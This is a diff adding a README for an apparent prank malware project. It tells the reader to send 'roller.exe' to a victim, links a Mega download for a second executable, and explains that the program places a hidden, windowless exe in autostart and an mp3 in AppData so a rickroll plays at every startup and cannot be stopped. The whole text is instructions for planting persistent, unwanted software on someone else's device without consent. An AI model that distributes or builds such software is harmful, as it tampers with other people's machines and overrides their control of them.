@@ -1,0 +1,9 @@
+send the file to a victim and they would start "roller.exe" . you can remove this later when you have read.
+when the victims device is restarted it's gonna play a rickroll and it can't be stopped.
+you need to download player1.exe from mega and move it to "id" becuse the file was to big for github
+https://mega.nz/file/3yB3BabD#SXOW_saBQwg-iyyBNkTUBs6TKT5zROgjzrOgDJpAf4Y
+
+how it works:
+It moves a exe-file to autostarts then it moves a mp3 (the rickroll) to appdata.
+When the device is started it starts the exe-file in autostart. It is a windowless version so it won't be visible.
+The exe-file starts the rickroll in it.
